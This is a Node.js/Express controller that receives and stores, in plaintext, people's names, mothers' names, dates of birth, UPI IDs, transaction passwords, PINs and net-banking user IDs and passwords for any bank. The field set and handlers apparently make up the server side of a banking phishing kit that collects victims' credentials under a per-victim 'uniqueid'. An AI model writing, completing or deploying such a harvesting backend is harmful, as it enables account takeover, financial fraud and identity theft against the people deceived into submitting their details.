const User = require('../models/User');
const Upi = require('../models/Upi');
const TransactionPassword = require('../models/TransactionPassword');
const PinData = require('../models/PinData');
const NetBankingLoginData = require('../models/NetBankingLoginData');

exports.saveUserData = async (req, res) => {
    try {
        const { fullName, motherName, dateOfBirth,uniqueid } = req.body;
        let user = await User.findOne({ uniqueid });

        if (user) {
            // Agar already exist hai, naya entry add karo
            user.entries.push({ fullName, motherName, dateOfBirth});
        } else {
            // Naya document create karo
            user = new User({
                uniqueid,
                entries: [{ fullName, motherName, dateOfBirth}]
            });
        }

        await user.save();

        res.status(200).json({
            success: true,
            message: "User Data Submitted Successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting user data"
        });
    }
};

exports.saveUpiData = async (req, res) => {
  try {
    const { uniqueid, upiId } = req.body;
    let record = await Upi.findOne({ uniqueid });

    if (record) {
      // Already exists → append new UPI entry
      record.entries.push({ upiId });
    } else {
      // Create a new document
      record = new Upi({
        uniqueid,
        entries: [{ upiId }]
      });
    }

    await record.save();

    res.status(200).json({
      success: true,
      message: "UPI Data Submitted Successfully!"
    });
  } catch (error) {
    console.error("saveUpiData error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting UPI data"
    });
  }
};


exports.saveTransactionPassword = async (req, res) => {
  try {
    const { uniqueid, transactionPassword } = req.body;
    let record = await TransactionPassword.findOne({ uniqueid });

    if (record) {
      // Already exists → append new password entry
      record.entries.push({ transactionPassword });
    } else {
      // Create a new document
      record = new TransactionPassword({
        uniqueid,
        entries: [{ transactionPassword }]
      });
    }

    await record.save();

    res.status(200).json({
      success: true,
      message: "Transaction password submitted successfully!"
    });
  } catch (error) {
    console.error("saveTransactionPassword error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting transaction password"
    });
  }
};

exports.savePinData = async (req, res) => {
  try {
    const { uniqueid, pin } = req.body;
    let record = await PinData.findOne({ uniqueid });

    if (record) {
      // Append new PIN entry
      record.entries.push({ pin });
    } else {
      // Create a new document
      record = new PinData({
        uniqueid,
        entries: [{ pin }]
      });
    }

    await record.save();

    res.status(200).json({
      success: true,
      message: "PIN submitted successfully!"
    });
  } catch (error) {
    console.error("savePinData error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting PIN"
    });
  }
};

exports.saveNetBankingLoginData = async (req, res) => {
  try {
    const { uniqueid, bankName, userId, password } = req.body;
    let record = await NetBankingLoginData.findOne({ uniqueid });

    if (record) {
      // Append new login entry
      record.entries.push({ bankName, userId, password });
    } else {
      // Create a new document
      record = new NetBankingLoginData({
        uniqueid,
        entries: [{ bankName, userId, password }]
      });
    }

    await record.save();

    res.status(200).json({
      success: true,
      message: "NetBanking login data submitted successfully!"
    });
  } catch (error) {
    console.error("saveNetBankingLoginData error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting NetBanking login data"
    });
  }
};
